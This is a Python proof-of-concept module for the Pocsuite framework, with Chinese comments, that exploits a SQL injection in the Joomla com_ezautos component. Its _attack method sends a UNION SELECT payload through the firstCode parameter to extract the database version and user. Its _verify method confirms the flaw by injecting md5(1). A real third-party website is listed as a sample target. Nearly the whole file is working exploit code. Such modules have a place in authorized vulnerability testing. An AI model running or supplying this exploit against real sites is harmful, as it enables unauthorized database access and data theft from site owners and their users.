#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '69896'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-10-09'
    createDate = '2016-01-09'
    updateDate = '2016-01-09'
    references = ['http://www.sebug.net/vuldb/ssvid-69896']
    name = 'Joomla Component (com_ezautos) SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.com'
    appName = 'Joomla'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        joomla组件com_ezautos存在SQL注入漏洞，
        远程攻击者可借助index.php中的helpers操作的firstCode参数执行任意SQL命令。
    '''
    samples = ['http://www.auto-tradelink.co.uk']

    def _attack(self):
        #利用注入漏洞读取数据库信息
        result = {}
        #利用的payload
        payload="1+and+0+union+select+1,2,concat('$~~~$',version(),'***',user(),'$~~~$'),4,5,6,7--"
        #漏洞地址
        exploit='/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #正则表达式
        par="\$~~~\$([0-9a-zA-Z_].*)\*\*\*([0-9a-zA-Z_].*)\$~~~\$"
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否有特殊字符串
        if '$~~~$' in resp.content:
            match=re.search(par,resp.content,re.I|re.M)
            if match:
                #漏洞利用成功
                result['DatabaseInfo']={}
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(1)
                #数据库用户
                result['DatabaseInfo']['Username']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #利用注入漏洞计算md5(1)
        result = {}
        #利用的payload
        payload='1+and+0+union+select+1,2,md5(1),4,5,6,7--'
        #漏洞地址
        exploit='/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否有特殊字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)